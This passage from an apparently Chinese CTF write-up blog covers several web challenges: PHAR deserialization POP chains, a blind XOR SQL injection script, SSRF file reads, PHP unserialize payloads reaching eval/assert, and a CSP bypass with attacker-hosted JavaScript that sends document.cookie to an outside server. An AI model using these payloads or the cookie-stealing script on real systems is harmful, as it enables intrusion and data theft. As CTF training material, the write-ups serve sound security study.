&#123;</span><br><span class="line">    @unlink(&quot;phar.zip&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$zip = new ZipArchive;</span><br><span class="line">$res = $zip-&gt;open(&#x27;phar.zip&#x27;, ZipArchive::CREATE);</span><br><span class="line">$zip-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;file content goes here&#x27;);</span><br><span class="line">$zip-&gt;setArchiveComment($d);</span><br><span class="line">$zip-&gt;close();</span><br></pre></td></tr></table></figure>
<p>以及</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">tar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class View &#123;</span><br><span class="line">    public $fn;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($this-&gt;fn));</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;&quot;.$text.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $fun = &quot;:)&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $fuc = $this-&gt;fun;</span><br><span class="line">        $fuc();</span><br><span class="line">        return &quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;Just a fun &quot;.$this-&gt;fun.&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new View();</span><br><span class="line">$a-&gt;fn = &#x27;/flag&#x27;;</span><br><span class="line">$b = new Fun();</span><br><span class="line">$b-&gt;fun = $a;</span><br><span class="line">$c = new Fun();</span><br><span class="line">$c-&gt;fun = $b;</span><br><span class="line">@unlink(&quot;phar.tar&quot;);</span><br><span class="line">@system(&#x27;rm -r .phar&#x27;);</span><br><span class="line">@system(&#x27;mkdir .phar&#x27;);</span><br><span class="line">file_put_contents(&#x27;.phar/.metadata&#x27;,serialize($c));</span><br><span class="line">system(&#x27;tar -cf phar.tar .phar/*&#x27;);</span><br></pre></td></tr></table></figure>
<p>然后构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phar://./phar.tar</span><br><span class="line">phar:///var/www/html/uploads/phar.tar</span><br></pre></td></tr></table></figure>
<p>即可通过 phar 反序列化触发 pop 链得到 flag </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-异或注入及ssrf读取漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/15/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E5%8F%8Assrf%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  	<time datetime="2021-08-14T16:00:00.000Z" itemprop="datePublished">2021-08-15</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/15/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E5%8F%8Assrf%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
        异或注入或盲注及ssrf读取漏洞
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="异或注入或盲注及ssrf读取漏洞"><a href="#异或注入或盲注及ssrf读取漏洞" class="headerlink" title="异或注入或盲注及ssrf读取漏洞"></a>异或注入或盲注及ssrf读取漏洞</h1><p>通过信息收集，发现有username和password，但是尝试过都不能注入，然后再打开index.html文件，发现有一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/image.php?id=3</span><br></pre></td></tr></table></figure>
<p>推测此为注入点，然后使用异或注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/image.php?id=1^(ascii(substr((select(database())),1,1))&gt;1)^1</span><br></pre></td></tr></table></figure>
<p>发现有回显，然后更换参数，直到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/image.php?id=1^(ascii(substr((select(database())),1,1))&gt;99)^1</span><br></pre></td></tr></table></figure>
<p>没有产生回显，可知数据库第一个字母为1</p>
<p>以此类推，按原理写一个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &quot;http://url/image.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;</span><br><span class="line">word=&quot;&quot;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    l = 32</span><br><span class="line">    h = 128</span><br><span class="line">    mid = (l + h)</span><br><span class="line">    while (l &lt; h):</span><br><span class="line">        nurl=url.format(i,mid)</span><br><span class="line">        r=requests.get(url=nurl)</span><br><span class="line">        if &#x27;JFIF&#x27; in r.text:</span><br><span class="line">            l = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            h = mid</span><br><span class="line">        mid = (l + h) // 2</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">    word += chr(mid)</span><br><span class="line">    print(word)</span><br><span class="line">print(word)</span><br></pre></td></tr></table></figure>
<p>得到表名为users</p>
<p>通过修改url的值继续爆破，得到密码值</p>
<p>而后登录账号，发现是ssrf读取文件漏洞，尝试构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:// /flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-cookie语句" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/15/cookie%E8%AF%AD%E5%8F%A5/" class="article-date">
  	<time datetime="2021-08-14T16:00:00.000Z" itemprop="datePublished">2021-08-15</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/15/cookie%E8%AF%AD%E5%8F%A5/">
        cookie语句
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="cookie语句"><a href="#cookie语句" class="headerlink" title="cookie语句"></a>cookie语句</h1><p>通过对得到的两个php文件进行分析</p>
<p>user.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">	public $count;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>add_api.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;user.php&quot;;</span><br><span class="line">if($user=unserialize($_COOKIE[&quot;data&quot;]))&#123;</span><br><span class="line">	$count[++$user-&gt;count]=1;</span><br><span class="line">	if($count[]=1)&#123;</span><br><span class="line">		$user-&gt;count+=1;</span><br><span class="line">		setcookie(&quot;data&quot;,serialize($user));</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		eval($_GET[&quot;backdoor&quot;]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	$user=new User;</span><br><span class="line">	$user-&gt;count=1;</span><br><span class="line">	setcookie(&quot;data&quot;,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>通过对代码的分析，我们可知user.php文件是创建了一个User对象，里面有一个变量count</p>
<p>同时add_api.php文件中的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user=unserialize($_COOKIE[&quot;data&quot;])</span><br></pre></td></tr></table></figure>
<p>表示获取cookie为data的序列，解序列赋给user，里面有一个count的变量，手动赋值</p>
<p>而其中的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$count[++$user-&gt;count]=1;</span><br></pre></td></tr></table></figure>
<p>表示对count数组中的第n+1位赋值为1<br>由于第五排的一个赋值操作，不需要绕过第五排的赋值操作才能进入else的后门程序，所以使用PHP溢出来跨过</p>
<p>因此可以构造payloay</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:5:&quot;count&quot;;i:9223372036854775806;&#125;</span><br><span class="line">#i表示int</span><br><span class="line">#s表示string，要加上字符串的长度</span><br></pre></td></tr></table></figure>
<p>cookie语句的详细学习：<a target="_blank" rel="noopener" href="https://blog.csdn.net/sm20170867238/article/details/90762010">https://blog.csdn.net/sm20170867238/article/details/90762010</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-php逃逸" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/08/php%E9%80%83%E9%80%B8/" class="article-date">
  	<time datetime="2021-08-07T16:00:00.000Z" itemprop="datePublished">2021-08-08</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/08/php%E9%80%83%E9%80%B8/">
        php逃逸
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="php逃逸"><a href="#php逃逸" class="headerlink" title="php逃逸"></a>php逃逸</h1><p>查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$safe=&quot;Hack me!&quot;;</span><br><span class="line"></span><br><span class="line">class Hacker&#123;</span><br><span class="line">    public $name=&quot;var_dump&quot;;</span><br><span class="line">    public $msg=&quot;Happy to cjb&quot;;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        global $safe;</span><br><span class="line">        if(preg_match(&#x27;/\d|\/|,|\([^()]*\([^()]*\)/&#x27;,$this-&gt;msg))&#123;</span><br><span class="line">            $this-&gt;name=&quot;var_dump&quot;;</span><br><span class="line">            $this-&gt;msg=&quot;You look dangerous!!!&quot;;</span><br><span class="line">            $safe=&quot;I think waf is enough.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        call_user_func($this-&gt;name,$this-&gt;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        global $safe;</span><br><span class="line">        var_dump($safe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一种思路，可以利用shell来绕过，可构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval($_POST[&#x27;shell&#x27;])&amp;&amp;shell=写命令</span><br></pre></td></tr></table></figure>
<p>来绕过，构造payload就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:22:&quot;eval($_POST[&#x27;shell&#x27;]);&quot;;&#125;&amp;&amp;shell=show_source(&quot;/you_never_know_my_name&quot;);</span><br></pre></td></tr></table></figure>

<p>第二种思路</p>
<p>就是在类中写两次相同的属性名，后面的属性值会覆盖前面的属性值（注意：类的属性个数记得加1）</p>
<p>第三种思路</p>
<p>这里过滤了系统执行的函数，而又不知道flag的文件名，因此这里可以用assert绕过，但是这里的正则过滤了括号嵌套，而不用get或post很难进行输出<br>因此可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">global $safe;</span><br><span class="line">var_dump($safe);</span><br></pre></td></tr></table></figure>
<p>来输出，所以可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看flag文件名</span><br><span class="line">info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:57:&quot;$safe=chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;)?scandir(&#x27;.&#x27;):&#x27;&#x27;&quot;;&#125;</span><br><span class="line"></span><br><span class="line">读flag文件</span><br><span class="line">info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:85:&quot;$safe=chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;).file_get_contents(&#x27;you_never_know_my_name&#x27;)&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-ssl数字证书" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/08/ssl%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/" class="article-date">
  	<time datetime="2021-08-07T16:00:00.000Z" itemprop="datePublished">2021-08-08</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/08/ssl%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/">
        SSL数字证书
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="SSL数字证书及原生类绕过"><a href="#SSL数字证书及原生类绕过" class="headerlink" title="SSL数字证书及原生类绕过"></a>SSL数字证书及原生类绕过</h1><p>通过F12查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!isset($_GET[&#x27;user&#x27;])&amp;&amp;!isset($_GET[&#x27;username&#x27;])&amp;&amp;!isset($_GET[&#x27;source&#x27;])&amp;&amp;!isset($_GET[&#x27;query&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: ./?username=guest&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$test=md5(uniqid(&#x27;&#x27;,true));</span><br><span class="line">header(&quot;Content-Security-Policy:  script-src &#x27;strict-dynamic&#x27; &#x27;nonce-$test&#x27;; img-src &#x27;self&#x27;; style-src &#x27;self&#x27;;  font-src &#x27;self&#x27;; frame-src &#x27;none&#x27; &quot;);</span><br><span class="line">header ( &quot;Cache-Control: no-cache, must-revalidate &quot; );</span><br><span class="line">function getCurrentUrl()&#123;</span><br><span class="line">    $scheme = $_SERVER[&#x27;REQUEST_SCHEME&#x27;];</span><br><span class="line">    $domain = $_SERVER[&#x27;HTTP_HOST&#x27;];</span><br><span class="line">    $requestUri = $_SERVER[&#x27;REQUEST_URI&#x27;];</span><br><span class="line">    $currentUrl = $scheme . &quot;://&quot; . $domain . $requestUri;</span><br><span class="line">    return $currentUrl;</span><br><span class="line">&#125;</span><br><span class="line">class user&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if (is_string($this-&gt;username))&#123;</span><br><span class="line">            if (preg_match(&#x27;/script|&lt;|&gt;|onload|onerror/i&#x27;,$this-&gt;username))&#123;</span><br><span class="line">                die(&#x27;no xss&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;&lt;h1 id=&quot;username&quot;&gt;&#x27;.htmlentities(&#x27;welcome back &#x27;.$this-&gt;username).&#x27;&lt;/h1&gt;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &#x27;&lt;h1 id=&quot;username&quot;&gt;&#x27;.$this-&gt;username.&#x27;&amp;nbsp&amp;nbspis&amp;nbsp&amp;nbspnot&amp;nbsp&amp;nbspallowed,&amp;nbsp&amp;nbsponly&amp;nbsp&amp;nbspstring&#x27;.&#x27;&lt;/h1&gt;&#x27;;</span><br><span class="line">            file_put_contents(&#x27;admin.log&#x27;,$_GET[&#x27;user&#x27;]);   //admin will check who attacks him in /admin.php</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;source&#x27;]))&#123;</span><br><span class="line">    $text=file_get_contents(__FILE__);</span><br><span class="line">    echo $text;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;query&#x27;]))&#123;</span><br><span class="line">    //drive bot to visit your page</span><br><span class="line">    //source code : browser.get(&#x27;http://127.0.0.1/?&#x27;+sys.argv[1])</span><br><span class="line">    //query example:</span><br><span class="line">    //your url : httP://127.0.0.1/?username=guest</span><br><span class="line">    //query : username=guest</span><br><span class="line">    $text=escapeshellarg($_GET[&#x27;query&#x27;]);</span><br><span class="line">    #echo($text);</span><br><span class="line">    system(&#x27;python /var/xssbot/xssbot.py &#x27;.$text);</span><br><span class="line">    //sleep(3);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=&#x27;stylesheet&#x27; href=&#x27;./css/stylesheet.css&#x27;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;&lt;!--?source=1--&gt;\n&quot;;</span><br><span class="line">echo &quot;&lt;body&gt;\n&quot;;</span><br><span class="line">if (isset($_GET[&#x27;user&#x27;]))&#123;</span><br><span class="line">    unserialize(urldecode(base64_decode($_GET[&#x27;user&#x27;])));</span><br><span class="line">&#125;</span><br><span class="line">else if(isset($_GET[&#x27;username&#x27;]))&#123;</span><br><span class="line">    echo &#x27;&lt;h1 id=&quot;username&quot;&gt;&#x27;.htmlentities(&#x27;hello &#x27;.$_GET[&#x27;username&#x27;]).&#x27;&lt;/h1&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &#x27;&lt;div id=&quot;particles-js&quot;&gt;&lt;/div&gt;&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/jquery-1.12.0.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/particles.min.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/app.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line"> &quot;;</span><br><span class="line">echo &quot;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>通过对代码的审计，可知有两层的绕过，第一层是is_string()的绕过，可以使用原生类Exception()来绕过</p>
<p>绕过第一层后，我们可以发现CSP(SSL数字证书）:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src&#x27;strict-dynamic&#x27;&#x27;nonce-$test&#x27;;</span><br></pre></td></tr></table></figure>
<p>通过uniqid，nonce是不可知的，因此我们发现一串代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/jquery-1.12.0.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/particles.min.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/app.js&#x27;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>因此我们可以通过<base>修改自己的服务器的地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=&quot;//xx.xx.xx.xx:22222&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>结合起来，可以得到一个exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $username;</span><br><span class="line">&#125;</span><br><span class="line">$user=new user();</span><br><span class="line">$user-&gt;username=new Exception(&#x27;&lt;base href=&quot;//xx.xx.xx.xx:22222&quot;&gt;&#x27;);</span><br><span class="line">echo base64_encode(serialize($user));</span><br></pre></td></tr></table></figure>

<p>然后我们利用ubuntu来创建一个./js/app.js文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-4-10-ubuntu:~# cat ./js/app.js </span><br><span class="line">window.open(&#x27;http://xx.xx.xx.xx:22222/&#x27;+document.cookie)</span><br></pre></td></tr></table></figure>

<p>构造payload为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=user=&lt;base64代码&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">49.235.148.38 - - [14/Jul/2021 13:36:29] &quot;GET /js/particles.min.js HTTP/1.1&quot; 404 -</span><br><span class="line">49.235.148.38 - - [14/Jul/2021 13:36:29] code 404, message File not found</span><br><span class="line">49.235.148.38 - - [14/Jul/2021 13:36:29] &quot;GET /flag=ctfshow%7Bc4580781-d9de-449f-a8ec-f79c6464f037%7D%0A HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-表情包加密" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/01/%E8%A1%A8%E6%83%85%E5%8C%85%E5%8A%A0%E5%AF%86/" class="article-date">
  	<time datetime="2021-07-31T16:00:00.000Z" itemprop="datePublished">2021-08-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/08/01/%E8%A1%A8%E6%83%85%E5%8C%85%E5%8A%A0%E5%AF%86/">
        表情包解密及MP3文件分析
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
